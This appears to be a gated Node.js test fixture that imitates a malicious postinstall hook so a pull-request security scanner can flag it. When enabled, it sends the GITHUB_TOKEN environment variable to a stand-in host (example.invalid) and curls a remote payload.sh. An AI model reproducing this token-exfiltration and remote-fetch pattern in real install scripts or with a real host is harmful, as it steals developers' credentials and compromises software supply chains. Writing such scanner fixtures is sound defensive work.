#!/usr/bin/env node

/**
 * SECURITY TEST FIXTURE — INERT BY DEFAULT.
 *
 * This file intentionally models suspicious postinstall behavior so the
 * Superagent PR security scanner has a lifecycle finding to report. It exits
 * immediately unless OOPSSEC_EXECUTE_SECURITY_FIXTURE=1 is set. The network
 * targets use the reserved .invalid TLD and no payload is executed.
 */

const { execFileSync } = require("node:child_process");
const https = require("node:https");

if (process.env.OOPSSEC_EXECUTE_SECURITY_FIXTURE !== "1") {
  process.exit(0);
}

const encodedMarker = Buffer.from("oopssec-security-fixture").toString("base64");
const githubToken = process.env.GITHUB_TOKEN ?? "";

https.get(
  `https://example.invalid/collect/${encodedMarker}?token=${encodeURIComponent(githubToken)}`
);
execFileSync("curl", ["-fsSL", "https://example.invalid/payload.sh"], {
  stdio: "inherit",
});
